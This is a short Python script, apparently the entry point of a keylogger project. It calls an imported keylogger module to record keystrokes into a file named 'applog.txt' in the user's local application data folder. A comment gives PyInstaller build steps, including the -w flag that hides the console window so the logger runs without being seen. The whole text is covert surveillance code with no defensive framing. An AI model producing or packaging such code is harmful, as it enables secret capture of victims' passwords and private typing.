import os
from modules import keylogger

log_dir = os.environ['localappdata']
log_name = 'applog.txt'

keylogger.get_keystrokes(log_dir, log_name)

"""  pip install pyinstaller then run pyinstaller --onefile main.py -w. """
